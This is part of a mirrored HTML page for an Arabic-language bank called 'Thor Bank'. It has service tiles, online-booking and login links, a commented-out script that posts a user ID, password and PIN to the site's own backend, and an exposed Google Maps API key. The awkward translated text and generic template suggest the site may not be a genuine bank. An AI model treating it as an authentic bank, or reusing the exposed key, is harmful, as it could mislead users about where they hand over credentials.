						<p>ابحث عن الشخص المناسب لاحتياجاتك وظروفك.</p>	
					</div>									
				</div>					
				<div class="col-md-3 no-padding">				
					<div class="single-colorful-feature feature-color-3">
						<h2><a href="travel-money.html">السفر المال<i class="fa fa-angle-right" aria-hidden="true"></i></a></h2>
						<p>تحقق من الأسعار واطلب عبر الإنترنت الآن.</p>	
					</div>									
				</div>					
				<div class="col-md-3 no-padding">				
					<div class="single-colorful-feature feature-color-4">
						<h2><a href="saving-accounts.html">مدخرات<i class="fa fa-angle-right" aria-hidden="true"></i></a></h2>
						<p>انظر كيف يمكننا مساعدة أموالك على العمل بجدية أكبر.</p>	
					</div>									
				</div>
				</div>
			</div>		
		</div>
	</div>

	<div class="business-wr">
		<div class="container">
			<div class="row">
				<div class="col-md-4">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-1.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="#">ما يصل إلى 20.000 دولار أمريكي هذا العام<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>حقق أقصى استفادة من 2023/<script>
function myFunction() {
  var d = new Date();
  var n = d.getFullYear();
  document.getElementById("demo").innerHTML = n;
}
</script> علاوة على أسهم وأسهم من البنك المختار.</span>
						</div>
					</div>
				</div>			
				<div class="col-md-4">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-2.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="users/form/reg.html">احجز موعدًا<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>يمكنك الآن حجز موعد عبر الإنترنت. قد يفضل العملاء الحاليون تسجيل الدخول إلى الخدمات المصرفية عبر الإنترنت لجعل الحجز أكثر بساطة.</span>
							<div class="cols-m-12 bookingbtn">
								<a href="secured/users/form/reg.html">احجز الآن<i style="margin-left: 5px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
								<a href="secured/users/form/index.php">تسجيل الدخول والحجز الآن<i style="margin-left: 5px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							</div>
						</div>
					</div>
				</div>			
				<div class="col-md-4">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-3.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="#">سياج حلقي<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>نحن بصدد تغيير طريقة البنك منظم مع بعض البنوك في الاتحاد الأوروبي.</span>
						</div>
					</div>
				</div>	
			</div>
		</div>
	</div>

	<div class="business-portfolio-1x" id="portfolio">
		<div class="container">
			<div class="row" style="padding: 30px 0;">
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-4.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="insurance.html">تأمين<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>حماية عائلتك وممتلكاتك.</span>
						</div>
					</div>
				</div>	
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-5.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="users/form/index.php">قم بتفعيل بطاقتك<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>هناك عدة طرق لتفعيل بطاقتك بسهولة. اختر الخيار الأفضل لك.</span>
						</div>
					</div>
				</div>	
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-6.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="protecting-what-matters.html">مركز الأمن<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>نصائح مفيدة مصممة لمساعدتك على البقاء آمنًا على الإنترنت.</span>
						</div>
					</div>
				</div>
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-7.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="contactandsupport.html">أدلة مفيدة<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>مجموعة من الأدلة والمقالات من فهم APRs إلى تلميحات التوفير.</span>
						</div>
					</div>
				</div>	
				<div class="col-sm-12" style="height: 1px;width: 100%;background-color:#EF454D;"></div>
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/bl-840.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="protection-telephone-advice.html">مفتاح الأمان<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>عروض توضيحية مفيدة لمساعدتك على تنشيط مفتاحك الآمن وإعادة تعيينه واستخدامه.</span>
						</div>
					</div>
				</div>	
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-9.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="protecting-what-matters.html">معرف الصوت<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>اجعل صوتك كلمة مرورك للخدمات المصرفية عبر الهاتف</span>
						</div>
					</div>
				</div>
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/blog-8.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="contactandsupport.html">دعم البطاقة<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>تفعيل ، ضياع أو سرقة ، ودعم البطاقة العام</span>
						</div>
					</div>
				</div>
				<div class="col-md-3">
					<div class="single-bolg hover01">
						<figure><img src="images/couple-hiking-840.jpg" alt="slide 1" class=""></figure>
						<div class="blog-content">
							<a href="insurance.html">PPI<i style="margin-left: 10px;" class="fa fa-angle-right" aria-hidden="true"></i></a>
							<span>المواعيد النهائية لمطالبة تأمين حماية الدفع</span>
						</div>
					</div>
				</div>	
			</div>
		</div>
	</div>
      
    <div class="padding-top-large"></div>
	
	<div class="business-app-present-2x">	
		<div class="app-present-content-2">	
			<div class="container">
				<div class="row">

					<div class="col-md-12">
						<div class="business-title-middle">
							<h2>الأخبار والمعلومات الخاصة بك</h2>
							<span class="title-border-middle"></span>
						</div>
					</div>
					
					<div class="col-md-5">				
						<div class="app-present-left-2">
							<img src="images/Question-mark.jpg" alt="Mountains" class="">
						</div>									
					</div>
					<div class="col-md-6" style="background-color: rgba(3, 61, 117, .1);">		
						<div class="app-present-right-2">
							<div class="single-app-present">
								<div class="media">
								  <div class="media-body">
									<h2>أسئلة الحساب؟ فقط إسألني.</h2>
									<p>لا يفصلك سوى بضع نقرات - افتح تطبيق Thor Bank® للجوّال وقل مرحبًا.</p>
									<a class="bussiness-btn-larg" href="contactandsupport.html">اسال اسئلة</a>
								  </div>
								</div>
							</div>		
						</div>		
					</div>
					
				</div>		
			</div>
		</div>
	</div> 
      
    <div class="padding-top-large"></div>
	
	<div class="business-cta-1x">	
		<div class="container">
			<div class="row">					
				<div class="col-md-12">
					<div class="cta-content">
						<h2>افتح حساب التوفير الأكثر شهرة لدينا</h2>
						<h3>التقدم بطلب للحصول على مدخرات جديدة<sup>℠</sup> الحساب في دقائق.</h3>
						<a href="users/form/index.php" class="bussiness-btn-larg">قدم الآن</a>
					</div>									
				</div>		
			</div>		
		</div>
    </div> 

	<!-- End Client Map -->	
<!--home content end-->
	<div class="col-sm-12 connectus">
		<div class="container">
			<div class="inner-connect">
				<h5> اتصل بنا </h5>
				<a href="contactandsupport.html">الاستماع إلى ما لديك لتقوله عن خدماتنا يهمنا.</a>
			</div>
		</div>
	</div>
	<!-- Start Footer -->
	<footer class="bussiness-footer-1x">		
	    <div class="bussiness-footer-content ">
			<div class="container">
				<div class="row">
					<div class="col-md-3">	
						<h5> مساعدة و دعم </h5>
						<a href="contactandsupport.html">حصلت على السؤال؟ نحن هنا لمساعدتك </a>
					</div>
					<div class="col-md-3">
						<h5> ابحث عن فرع </h5>
						<a href="branch-locator.html">ابحث عن أقرب موقع غير مصرفي إليك</a>
					</div>							
					<div class="col-md-3">	
						<h5> أداؤنا </h5>
						<a href="why-invest-with-us.html">اعرض لوحة معلومات الخدمة الخاصة بنا لترى كيف نقوم بذلك</a>		
					</div>

					<div class="col-md-3">	
						<h5> حول ثور بنك</h5>								
						<a href="getting-started.html">الوظائف ووسائل الإعلام والمستثمر ومعلومات الشركة</a>							
					</div>					

                    <div class="container">	
                        <div class="">
                            <div class="col-md-12 footer-info">
                                <div class="row">	
                                    <div class="col-md-6">	
                                        <div class="footer-info-left">	
                                            <!--<p><a href="#">thor Bank Banking Group</a></p>-->
                                            <img style="max-width:125px;" src="logofooter.png" class="d-inline-block align-top" alt="">
                                        </div>			
                                    </div>			
                                    <div class="col-md-6">
                                        <div class="footer-info-right">
                                            <ul>
                                                <li><a href="#"> <i class="fa fa-facebook"></i> </a></li>										
                                                <li><a href="#"> <i class="fa fa-twitter"></i> </a></li>											
                                                <li><a href="#"> <i class="fa fa-google"></i> </a></li>									
                                                <li><a href="#"> <i class="fa fa-linkedin"></i> </a></li>											
                                            </ul>					
                                        </div>					
                                    </div>					
                                </div>					
                            </div>					
                        </div>	  
					</div>
				</div>					
			</div>			
	    </div>		  
	</footer>	
	<!-- End Footer -->	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="1.12.4/jquery.min.js"></script>
	<script src="cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.html" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="js/bootstrap.min.js"></script>

	<!-- Wow Script -->
	<script src="js/wow.min.js"></script>
	<!-- Counter Script -->
	<script src="js/waypoints.min.js"></script>
	<script src="js/jquery.counterup.min.js"></script>
	<!-- Masonry Portfolio Script -->
    <script src="js/jquery.filterizr.min.js"></script>
    <script src="js/filterizer-controls.js"></script>
    <!-- OWL Carousel js-->
	<script src="js/owl.carousel.min.js"></script>  
	<!-- Lightbox js -->
	<script src="inc/lightbox/js/jquery.fancybox.pack.js"></script>
	<script src="inc/lightbox/js/lightbox.js"></script>
	<!-- Google map js -->
	<script  src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCa6w23do1qZsmF1Xo3atuFzzMYadTuTu0"></script>	
	<script src="js/map.js"></script>
	<!-- loader js-->
    <script src="js/fakeLoader.min.js"></script>
	<!-- Scroll bottom to top -->
	<script src="js/scrolltopcontrol.js"></script>
	<!-- menu -->
	<script src="js/bootstrap-4-navbar.js"></script>    
    <!-- Stiky menu -->
	<script src="js/jquery.sticky.js"></script>  
    <!-- youtube popup video -->
	<script src="js/jquery.magnific-popup.min.js"></script>  
    <!-- Color switcher js -->
	<script src="js/color-switcher.js"></script> 
    <!-- Color-switcher-active -->  
    <script src="js/color-switcher-active.js"></script>      
	<!-- Custom script -->
    <script src="js/custom.js"></script>
    <script src="js/jquery.bxslider.min.js"></script>
    
    <!-- for calucator---->
    	<script type="text/javascript" src="etc/clientlib-all.min.2f2dbb3959c1dcdb1f3b1f52f1375b62.js"></script>
		
		<script type="text/javascript" src="etc/clientlib.min.b3ec3a2325eaa4cbc74a2e2f0b755b0f.js"></script>
		


    <!--//---->
<!-- new script->

<!-- / script -->

<script src="ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="js/jquery.bxslider.min.js"></script>

<script type="text/javascript">
	$(document).ready(function(){
		if( ($(window).width() > 769) ) {
			$('.bxsliderwr').bxSlider({
				minSlides: 5,
	  			maxSlides: 5,
	  			slideWidth: 230,
	  			pager:true,
	  			slideMargin: 50,
	  			moveSlides:1,
	  			auto: true,
	  			infiniteLoop: true,
	  			mode: 'horizontal',
			});
		}
		else if( ($(window).width() < 769) && ($(window).width() > 481) ) {
			$('.bxsliderwr').bxSlider({
				minSlides: 3,
	  			maxSlides: 3,
	  			slideWidth: 230,
	  			pager:true,
	  			slideMargin: 50,
	  			moveSlides:1,
	  			auto: true,
	  			infiniteLoop: true,
	  			mode: 'horizontal',
			});
		}
		else{
			$('.bxsliderwr').bxSlider({
				minSlides: 3,
	  			maxSlides: 3,
	  			slideWidth: 230,
	  			pager:false,
	  			slideMargin: 50,
	  			moveSlides:1,
	  			auto: true,
	  			infiniteLoop: true,
	  			mode: 'horizontal',
			});
		}
	}); 
</script>
	<!-- <script type="text/javascript">
	var user_id="";
	 	$(document).ready(function(){
	 	    
	 	//	alert('hii');
	 		$("#firststepbutton2").click(
		     function(e)
			   {
	 		var password_user=$("#pwd").val();
				 var user_id=$("#usrnm").val();
				  if(user_id=="")
					    {
						  alert("Please Enter User ID..");
						  return false;	
						}
				     if(password_user=="")
					   {
						 alert("Please Enter Password..");
						 return false;   
					   }
					   else
					   {
						   
						   $.post("account/", { q:"step_login", password_user:password_user, user_id :user_id  }, function(data)
						    {
								if(data=="empty" || data=="wrongpassword")
								{
								 if(data=="empty")
								  {
								    
								    alert("Please Enter Password..");  
								  }
								  if(data=="wrongpassword")
								  {
									
									alert("UserId does not match with password..");  
								  }
								}
								else if(data=="threestep")
								{
								    user_id=data;
								    
									$('#threestep').show();
									$('#firststep').hide();

								}
								else
								{
									window.location.href='account/';
									
								  
								}
							}
						   );
					   }
					});
			

			
	 		$("#secondstepbutton2").click(
		     function(e)
			   {
	 		
				 var pin=$('#userpinid').val();
				  if(pin=="")
					    {
						  alert("Please Enter User ID..");
						  return false;	
						}
					   else
					   {
					      	var password_user=$("#pwd").val();
				                var user_id=$("#usrnm").val();
						   
						   $.post("account/", { q:"step_third_login", pin_user:pin ,password_user:password_user, user_id :user_id  }, function(data)
						    {
								if(data=="empty" || data=="invalid")
								{
								 if(data=="empty")
								  {
								    
								    alert("Please Enter Pin..");  
								  }
								  if(data=="invalid")
								  {
									
									alert("Invalid Pin");  
								  }
								}
								else
								{
									window.location.href='account/';
									
								  
								}
							}
						   );
					   }
					});
					
					
					
					
					
						$("#forgotpasswordbutton2").click(
		     function(e)
			   {
	 		
				 var pin=$('#useridtextid').val();
				  if(pin=="")
					    {
						  alert("Please Enter Online ID..");
						  return false;	
						}
					   else
					   {
					     
						   
						   $.post("account/", { q:"forgot_passwordorpin", accnumber:pin   }, function(data)
						    {
								 if(data==0)
                            	   {
                            		alert("Please Fill Account Number..");   
                            	   }
                            	   if(data==1)
                            	   {
                            		   alert("Invalid Account Number..");
                            	   }
                            	   if(data==2)
                            	   {
                            		   alert("Password/PIN sent to your email please check your inbox..");
                            		  // window.location.href='https://secure.astropex.online/users/form/';
                            	   }
	
							}
						   );
					   }
					});
			
    });
	
	</script> -->
	<script type="text/javascript">
var acc = document.getElementsByClassName("accordion");
var i;

for (i = 0; i < acc.length; i++) {
  acc[i].addEventListener("click", function() {
    this.classList.toggle("active");
    var panel = this.nextElementSibling;
    if (panel.style.maxHeight){
      panel.style.maxHeight = null;
    } else {
      panel.style.maxHeight = panel.scrollHeight + "px";
    } 
  });
}
</script>

<script src="../widget-v4.tidiochat.com/1_47_0/static/js/render.5256de5ea994e67b7927.js" async></script>

<script type="text/javascript" src='js/amcharts.html'></script> 
	<script type="text/javascript" src='js/overpaymentscalc-min.html'></script>

</body>

<!-- Mirrored from astropex.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 12 Jul 2020 13:13:41 GMT -->

<!-- Mirrored from secure.astropex.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 23 Dec 2020 20:37:43 GMT -->
</html>     